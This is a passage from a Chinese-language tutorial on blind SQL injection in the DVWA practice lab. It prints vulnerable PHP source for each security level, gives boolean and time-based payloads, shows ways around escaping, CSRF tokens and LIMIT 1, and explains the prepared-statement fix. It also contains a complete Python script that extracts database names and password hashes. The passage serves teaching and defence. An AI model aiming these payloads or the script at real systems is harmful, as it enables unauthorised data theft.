if( isset( $_GET[ 'Submit' ] ) ) {
    $id = $_GET[ 'id' ];  // ⚠️ 问题1：直接拿用户输入，完全没过滤！

    // 查询数据库
    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    // ⚠️ 问题2：直接把 $id 拼到 SQL 字符串里，单引号直接结束前面的字符串！
    $result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );
    $num = mysql_numrows( $result );

    if( $num > 0 ) {
        // ✅ True 页面：查到记录
        echo '<pre>User ID exists in the database.</pre>';
    } else {
        // ❌ False 页面：空结果
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );
        echo '<pre>User ID is MISSING from the database.</pre>';
    }
    mysql_close();
}
?>
```

**问题点（Low 级别 2 大致命漏洞）：**
1. **❌ 无任何过滤：** `$id` 直接从 `$_GET['id']` 取出，没 `mysql_real_escape_string()`，没 intval()，没删除单引号——我们的 `1' AND 1=2 -- ` 原封不动拼了进去。
2. **❌ 页面给出稳定 True/False：** `num_rows > 0` 给了明确的两种不同页面反馈——相当于"高冷客服"直接点头摇头，太方便了。

**修复建议（Low → Impossible）：** 用 **PDO 预处理语句 + 白名单**，详见 16.5 节。

---

## 16.3 Medium 级别：加了过滤？我们绕过它！🧨

### 16.3.1 Medium 做了什么保护？看页面和请求区别

先把 DVWA Security 切到 **medium**。

你会发现 **URL 上看不到 `?id=` 参数了！** 而且提交按钮提交后页面 URL 还是不变。抓个 Burp 包（或者浏览器 F12 → Network）一看：
- 请求方法：**POST**（不是 GET 了！参数在 body 里）
- Content-Type：application/x-www-form-urlencoded
- POST Body：`id=1&Submit=Submit`

**这意味着：Burp Suite / HackBar POST 请求 / Python requests 上场！** 不能只在 URL 里改参数了。

### 16.3.2 防护一：`mysql_real_escape_string()` 了单引号？但是...

看 Medium 源码：
```php
$id = mysql_real_escape_string($_POST['id']); // 转义单引号、双引号等
$getid = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
// ⚠️ 注意！这里 user_id = $id 外面没有引号！！是数字型查询！
```

**哈哈！经典乌龙开发者操作来了！🤣**
> 开发者心想：我用了 `mysql_real_escape_string()` 把单引号全转义成 `\'`，SQL 注入肯定没戏了！
> 结果：查询语句写成了 `WHERE user_id = $id`（$id 外**没有单引号**！）—— 这是**数字型注入**，根本不需要单引号！！

等于他在门上装了个最高级的指纹锁，然后**忘记装门**了 😂。

### 16.3.3 数字型注入 payload（不需要单引号！）

我们把 Low 级别的 payload 里所有 `'` 全部删掉，把 `-- ` 注释换成 `#` 也行：

**布尔盲注 True/False 测试：**
```
POST Body: id=1 AND 1=1&Submit=Submit     → exists  ✅ True
POST Body: id=1 AND 1=2&Submit=Submit     → missing ✅ False
```
**完美闭合！不用单引号！**（数字型就是这么任性 😎）

**猜数据库名长度：**
```
POST: id=1 AND LENGTH(DATABASE())=4&Submit=Submit → True ✅ (dvwa 长度 4)
```
**逐字符猜库名（第 1 字符 'd' ASCII=100）：**
```
POST: id=1 AND ASCII(SUBSTRING(DATABASE(),1,1))=100&Submit=Submit → True ✅
```

**时间盲注（同样不需要单引号）：**
```
POST: id=1 AND IF(SUBSTRING(DATABASE(),1,1)='d',SLEEP(3),0)&Submit=Submit → 延迟3s ✅
```

### 16.3.4 Medium 源码解析 + 绕过总结

```php
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    $id = mysql_real_escape_string( $_POST[ 'id' ] ); // ✅ 本想防字符型注入
    $getid = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
    // ⚠️ 但是 $id 两侧没有引号！= 数字型注入，根本不需要单引号！
    $result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );
    // ... 同样给出 exists / missing 两种 True/False 反馈
}
?>
```

**Medium 的两处"伪防护"总结：**
1. **❌ GET→POST：** 防君子不防小人，Burp/requests 改改 method 就完事
2. **❌ mysql_real_escape_string() + 无引号：** 自欺欺人，数字型注入直接绕过

> 🔥 **零基础启示：** 安全防护不是"加个函数就行"，要从**场景匹配**的角度思考——字符型用了转义+引号是对的，但你数字型写的查询就必须用 `intval($id)` 强转整数才对！

---

## 16.4 High 级别：加了 LIMIT + Anti-CSRF Token？照打不误！⚔️

### 16.4.1 High 级别加了啥防护？

切到 **high** 级别，发现 3 个变化：
1. **表单里多了一个隐藏 `user_token` 字段**（Anti-CSRF Token，必须先 GET 页面取 token，再带 token POST）
2. **SQL 语句里加了 `LIMIT 1`**：开发者心想"就算被注入，你最多只能拿 1 条数据，我看你咋办"
3. **id 依然是字符型**（`WHERE user_id = '$id' LIMIT 1;`）

### 16.4.2 绕过 Anti-CSRF Token 的思路

先 GET 请求一次页面（带上我们的 PHPSESSID cookie），从返回的 HTML 里用正则抠出 `user_token`：

```html
<input type="hidden" name="user_token" value="9079fd3efb1098e1a61aa34a992b9d7a">
```

拿到 token 之后，**下一次 POST 请求必须把 `user_token=9079fd...` 一并发过去**，不然服务器返回"Invalid token"。

> 🔥 **关键！High 级别每完成一次查询，token 都会变！** 所以我们不能"批量猜"，必须"拿一次 token，发一次请求；再拿一次 token，再发一次请求"——这就是为啥 High 级别比 Low/Medium 慢。Day15 JS Attacks 第 4 关（多步 token）我们练过一模一样的流程！老规矩用 Python Session + re.search 自动搞定👇（脚本见 16.6 节）。

### 16.4.3 绕过 `LIMIT 1`？用注释符 `--` 直接注释掉！

High 级别的 SQL 拼接：
```sql
SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;
```

我们的 payload：
```sql
1' AND SUBSTRING(DATABASE(),1,1)='d' -- 
```
后端拼接完变成：
```sql
SELECT ... WHERE user_id = '1' AND SUBSTRING(DATABASE(),1,1)='d' -- ' LIMIT 1;
```
看见没？**`-- '` 之后的 LIMIT 1（还有闭合单引号）都被当成注释忽略了！**🤣 开发者加的 `LIMIT 1` 直接白给！

### 16.4.4 High 级别完整 payload（布尔盲注 + 时间盲注）

```
布尔盲注 True/False：
  POST: id=1' AND 1=1 -- &user_token=xxxx&Submit=Submit  → exists True
  POST: id=1' AND 1=2 -- &user_token=xxxx&Submit=Submit  → missing False

布尔猜第1字符 'd'：
  POST: id=1' AND ASCII(SUBSTRING(DATABASE(),1,1))=100 -- &user_token=xxxx → True ✅

时间盲注（保险起见最常用）：
  POST: id=1' AND IF(SUBSTRING(DATABASE(),1,1)='d', SLEEP(3), 0) -- &token=xxxx → 延迟3s ✅
```

### 16.4.5 High 源码逐行解析 💻

```php
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    // Anti-CSRF Token 校验
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    $id = $_POST[ 'id' ];  // ⚠️ 问题：id 完全没过滤！
    $id = stripslashes( $id ); // stripslashes 反而把转义的 \' 还原成 '，帮倒忙！

    $getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
    // ⚠️ 字符型：给了我们 ' 注入机会；LIMIT 1 被 -- 直接注释无效
    $result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );
    $num = mysql_numrows( $result );

    if( $num > 0 ) { echo '<pre>User ID exists.</pre>'; }
    else           { header( '404' ); echo '<pre>User ID is MISSING.</pre>'; }
    // ⚠️ 问题：依然给出了 True/False 两种页面反馈
    generateSessionToken(); // 每次请求刷新 token
}
// 页面 GET 请求时生成 token
generateSessionToken();
?>
```

**High 三处伪防护总结：**
1. **Anti-CSRF Token：** Python Session 每次先 GET 拿 token 再 POST，绕过
2. **stripslashes()：** PHP 开启 GPC（老版本）会给 `'` 自动加 `\'`，但这个函数**帮我们还原成 `'`**了 😂
3. **LIMIT 1：** `--  ` 注释直接干掉，跟没有一样

---

## 16.5 Impossible 级别：彻底无解的正确写法 ✅

切到 **impossible**，这时候再注入，无论发啥 payload，页面要么显示 exists（正常），要么直接跳回 setup.php，完全不按你想的 True/False 规律走。看源码：

```php
<?php
if( isset( $_POST[ 'Submit' ] ) ) {
    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );

    $id = $_POST[ 'id' ];
    // ✅ 防护1：intval() 强转整数！彻底没注入机会了
    if( !is_numeric( $id ) ) { die( 'ID must be a number!' ); }
    $id = intval( $id );

    // ✅ 防护2：PDO 预处理语句！参数和 SQL 严格分开
    $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
    $data->bindParam( ':id', $id, PDO::PARAM_INT );
    $data->execute();

    // ✅ 防护3：只有"恰好查到1行"才说存在，否则都算不存在
    if( $data->rowCount() == 1 ) { echo '<pre>User ID exists.</pre>'; }
    else                         { echo '<pre>User ID is MISSING.</pre>'; }
}
generateSessionToken();
?>
```

**Impossible 的三层"铜墙铁壁"（开发者必看！⭐⭐⭐）：**
1. **✅ intval() 强转整数 + is_numeric() 校验：** 任何带 `'`、`AND`、`SLEEP` 的输入直接被拦截或转成 `int(1)`，注入点彻底被掐断
2. **✅ PDO 预处理 + bindParam(PDO::PARAM_INT)：** SQL 结构和用户数据彻底分离，就算是字符串字段也不会被注入（Day10 详细讲过 PDO）
3. **✅ rowCount()==1 严格判断：** 就算你有其他奇葩方法改了逻辑，只要返回行数不是 1，都当 MISSING，不给攻击者稳定的 True/False 反馈

> **🎯 正确修复结论：** 防 SQL 注入最彻底的办法只有一个——**预处理语句（PDO / MySqli Prepare）**，其他像 `addslashes`、WAF、黑名单、转义关键字，通通只是" delaying tactics（拖延战术）"，迟早能被绕过。

---

## 16.6 零基础懒人版：一键跑盲注的 Python 脚本 🔥

手动盲注太磨人？直接用下面这份 Python 脚本（布尔 + 时间 + Anti-CSRF Token 全支持），你改一下 `URL` 和 `cookies` 就能跑：

```python
import requests, re, sys

# ========== 配置区（你只需要改这里！） ==========
TARGET = "http://192.168.56.102/dvwa/vulnerabilities/sqli_blind/"
COOKIES = {"PHPSESSID": "ab12cd34ef56aa78bb90cc12ddeeff34", "security": "high"}
USE_TOKEN = True       # Low/Med=False, High/Impossible=True
TIME_BLIND = False     # True=时间盲注, False=布尔盲注
SLEEP_SEC = 3          # 时间盲注延迟秒数
CHARSET = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-=_+[]{};:,.<>/?~ "

def get_token(session, html):
    m = re.search(r'name="user_token"\s+value="([0-9a-f]+)"', html)
    return m.group(1) if m else None

def do_query(session, condition):
    """构造 payload 发送请求，返回 True/False"""
    if TIME_BLIND:
        payload = f"1' AND IF({condition}, SLEEP({SLEEP_SEC}), 0) -- "
    else:
        payload = f"1' AND {condition} -- "
    data = {"id": payload, "Submit": "Submit"}
    if USE_TOKEN:
        html_get = session.get(TARGET, cookies=COOKIES).text
        token = get_token(session, html_get)
        if token: data["user_token"] = token
    # 发送
    if TIME_BLIND:
        r = session.post(TARGET, data=data, cookies=COOKIES, timeout=15)
        return r.elapsed.total_seconds() >= (SLEEP_SEC - 0.5)  # 留 0.5s 容差
    else:
        r = session.post(TARGET, data=data, cookies=COOKIES, timeout=15)
        return "exists" in r.text and "MISSING" not in r.text

def get_length(session, sql_expr):
    """猜某个表达式的长度，二分 0~128"""
    lo, hi = 0, 128
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if do_query(session, f"LENGTH(({sql_expr})) >= {mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

def get_string(session, sql_expr, length):
    """逐字符爆破字符串"""
    result = ""
    sys.stdout.write(f"[*] 开始爆破 {sql_expr}（长度{length}）: ")
    sys.stdout.flush()
    for i in range(1, length + 1):
        # 枚举可见字符（如果是 MD5，charset 取前 16 个就够了）
        found = False
        for ch in CHARSET:
            cond = f"SUBSTRING(({sql_expr}),{i},1)=CHAR({ord(ch)})"
            if do_query(session, cond):
                result += ch
                sys.stdout.write(ch)
                sys.stdout.flush()
                found = True
                break
        if not found:
            result += "?"
            sys.stdout.write("?")
    print("  ✅")
    return result

if __name__ == "__main__":
    s = requests.Session()
    print("=" * 60)
    print("  🦇 DVWA SQL Injection (Blind) 自动化脚本")
    print("  📖 零基础同学只需修改本文件顶部的 5 个变量即可！")
    print("=" * 60)

    # 1. 先测连通性
    print("\n[Step 1] 连通性测试（True/False 一致性）...")
    t1 = do_query(s, "1=1")
    t2 = do_query(s, "1=2")
    assert t1 and not t2, "❌ True/False 判断不一致！检查 cookies/security 级别！"
    print(f"    ✅ True={t1}, False={t2} — 完美连通！\n")

    # 2. 爆数据库
    print("[Step 2] 爆当前数据库名 DATABASE()")
    db_len = get_length(s, "DATABASE()")
    db_name = get_string(s, "DATABASE()", db_len)
    print(f"    🎉 database = {db_name}\n")

    # 3. 爆 admin 密码 hash
    print("[Step 3] 爆 dvwa.users 里 admin 的 password 字段")
    admin_pwd_sql = "SELECT password FROM users WHERE user='admin' LIMIT 1"
    pwd_len = get_length(s, admin_pwd_sql)
    pwd_md5 = get_string(s, admin_pwd_sql, pwd_len)
    print(f"    🎉 admin.password = {pwd_md5}")
    print(f"       👉 去 https://www.cmd5.com 解密 → 就是 'password'！\n")

    print("🏁 盲注完成！恭喜你又点亮了一个黑客技能点！⭐")
```

> 📚 **零基础使用说明：** 把第 5-8 行的 `TARGET`、`COOKIES`、`security` 改成你自己的（浏览器 F12 → Application → Cookies 复制 PHPSESSID），然后 `python sqli_blind.py` 运行即可。High 级别把 `USE_TOKEN=True`；页面真假分不清就把 `TIME_BLIND=True`。**跑一次脚本大概 2~10 分钟**（取决于你的网络和时间盲注的 SLEEP_SEC），中间它会一个字符一个字符地把结果打印出来，跟看电影一样爽！😎

---

## 16.7 课后自测 + 作业 📝（零基础必做！）

### 📝 题 1：选择题（每题 10 分，共 30 分）

**1. 下列哪种 SQL 注入场景，最适合用时间盲注？**
- A. 页面把 SELECT 查询结果直接打印出来
- B. 页面只有"查询成功/查询失败"两种不同的文字
- C. 页面无论输入什么，返回的 HTML 内容完全一模一样
- D. 页面会打印 MySQL 的报错信息

**2. 盲注里要"猜某个字符串第 3 个字符的 ASCII 码是不是大于 100"，下列哪个 MySQL 组合是对的？**
- A. `SUBSTRING(str, 3, 1) > 100`
- B. `ASCII(SUBSTRING(str, 3, 1)) > 100`
- C. `LENGTH(SUBSTRING(str, 3, 1)) > 100`
- D. `ASCII(CHARSET(str, 3, 1)) > 100`

**3. DVWA High 级别 SQLi Blind 加了 user_token Anti-CSRF，正确的绕过思路是？**
- A. 直接在请求头里删掉 user_token 字段
- B. 每次 POST 前先 GET 拿新 token，再带着这个 token 发 POST
- C. 用 `SLEEP(3)` 把 token 睡过去
- D. user_token 只能防御 XSS，对 SQL 注入没影响可以忽略

### 🔧 题 2：实操题（每题 20 分，共 40 分）

**实操 1：Low 级别布尔盲注手动爆 DATABASE()**
打开 DVWA，切 security=low，进 SQL Injection (Blind)。**不用脚本**，就靠在输入框里一步步改 payload，用本章 16.2 节讲的二分法把 `DATABASE()` 的 4 个字符手动猜一遍，截图记录你的每一步。

**实操 2：High 级别爆 admin 的 user 字段和 password 字段**
切 security=high，用本章 16.6 节的 Python 脚本（把 `USE_TOKEN=True`，TIME_BLIND=True 最稳），爆出来 admin 的 user 和 password，确认 password 是 32 位的 `5f4dcc3b5aa765d61d8327deb882cf99`（即 MD5('password')）。

### 💡 题 3：思考题（30 分）

> 你是公司的 Web 开发者，同事写了下面这段 PHP 代码，自称"加了 `htmlspecialchars`，加了 `addslashes`，两层防护绝对安全"，你能找出至少 3 处"依然能被 SQL 盲注"的漏洞，并且写出一个能让页面延迟 3 秒的时间盲注 payload 吗？

```php
<?php
$name = addslashes( htmlspecialchars($_POST['username']) );
$sql  = "SELECT * FROM users WHERE username = $name LIMIT 1;";
//                   ^^^^^^^^ 注意：这里 $name 外面没有引号！
$result = mysqli_query($conn, $sql);
if( mysqli_num_rows($result) > 0 ) echo "User exists.";
else                               echo "User MISSING.";
?>
```

> **小提示：** 跟 16.3 节 Medium 级别的思路几乎一模一样哦！🤫

---

## 16.8 本章小结 + 下章预告 🚀

**🎉 Day16 SQL 盲注 通关总结：**
- ✅ 搞懂了三种注入的区别：**显注（话痨客服）/ 布尔盲注（高冷客服）/ 时间盲注（哑巴客服）**
- ✅ 盲注必备五件套背得滚瓜烂熟：**LENGTH + SUBSTRING + ASCII + SLEEP + IF**
- ✅ 标准四步流程刻进 DNA：**①闭合 True/False → ②猜长度 → ③逐个字符二分 → ④拼接答案**
- ✅ Low 级别裸注入、Medium 级别"加了转义却忘了加引号"的数字型绕过、High 级别 Anti-CSRF Token + LIMIT 1 双重伪防护绕过
- ✅ Impossible 级别的正确修复三件套：**intval 强类型 + PDO 预处理 + rowCount 严格校验**
- ✅ 拿到了一份能直接跑的 Python 盲注脚本（布尔/时间/Token 三合一）

盲注这个专题是整个 SQL 注入里**最耗耐心但也最出活儿**的一块——**你今天手动猜出 'dvwa' 那 4 个字符时的成就感，就是你日后做渗透工程师拿到第一个站点 root 权限时的感觉。**👍

下一章 Day17 我们学一个"看起来很简单但威力巨大"的漏洞——**Open HTTP Redirect 开放式重定向漏洞**，它是钓鱼攻击的第一"帮凶"：比如你收到"工商银行的短信"让你去 `icbc.com.cn/login?redirect=http://hacker.com`，你点进去先是真工行登录页，输完账号密码瞬间跳转到黑客的假页面——这就是重定向漏洞！Day17 我们拿 DVWA 的 Redirect 模块，Low/Med/High 三种方式逐个绕过，还会给你真实钓鱼案例，绝对精彩！💪

**同学们先把脚本跑通，把练习题做完。Day17 我们不见不散！👋**
